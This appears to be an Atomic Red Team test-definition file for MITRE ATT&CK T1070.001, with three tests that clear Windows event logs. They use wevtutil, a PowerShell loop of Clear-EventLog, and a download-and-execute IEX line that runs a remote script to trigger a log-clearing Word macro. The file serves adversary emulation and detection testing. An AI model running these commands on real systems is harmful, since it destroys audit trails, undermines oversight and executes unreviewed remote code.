{
  "attack_technique": "T1070.001",
  "display_name": "Indicator Removal on Host: Clear Windows Event Logs",
  "atomic_tests": [
    {
      "name": "Clear Logs",
      "description": "Upon execution this test will clear Windows Event Logs. Open the System.evtx logs at C:\\Windows\\System32\\winevt\\Logs and verify that it is now empty.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "command_prompt",
        "elevation_required": true,
        "command": "wevtutil cl #{log_name}"
      },
      "input_arguments": {
        "log_name": {
          "description": "Windows Log Name, ex System",
          "type": "string",
          "default": "System"
        }
      },
      "auto_generated_guid": "e6abb60e-26b8-41da-8aae-0c35174b0967"
    },
    {
      "name": "Delete System Logs Using Clear-EventLog",
      "description": "Clear event logs using built-in PowerShell commands.\nUpon successful execution, you should see the list of deleted event logs\nUpon execution, open the Security.evtx logs at C:\\Windows\\System32\\winevt\\Logs and verify that it is now empty or has very few logs in it.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": true,
        "command": "$logs = Get-EventLog -List | ForEach-Object {$_.Log}\n$logs | ForEach-Object {Clear-EventLog -LogName $_ }\nGet-EventLog -list"
      },
      "input_arguments": {},
      "auto_generated_guid": "b13e9306-3351-4b4b-a6e8-477358b0b498"
    },
    {
      "name": "Clear Event Logs via VBA",
      "description": "This module utilizes WMI via VBA to clear the Security and Backup eventlogs from the system. \n\nElevation is required for this module to execute properly, otherwise WINWORD will throw an \"Access Denied\" error",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": true,
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1070.001\\src\\T1070.001-macrocode.txt\" -officeProduct \"Word\" -sub \"ClearLogs\""
      },
      "input_arguments": {},
      "dependencies": [
        {
          "description": "Microsoft Word must be installed",
          "prereq_command": "try {\n  New-Object -COMObject \"Word.Application\" | Out-Null\n  Stop-Process -Name \"winword\"\n  exit 0\n} catch { exit 1 }",
          "get_prereq_command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\""
        }
      ],
      "auto_generated_guid": "1b682d84-f075-4f93-9a89-8a8de19ffd6e"
    }
  ]
}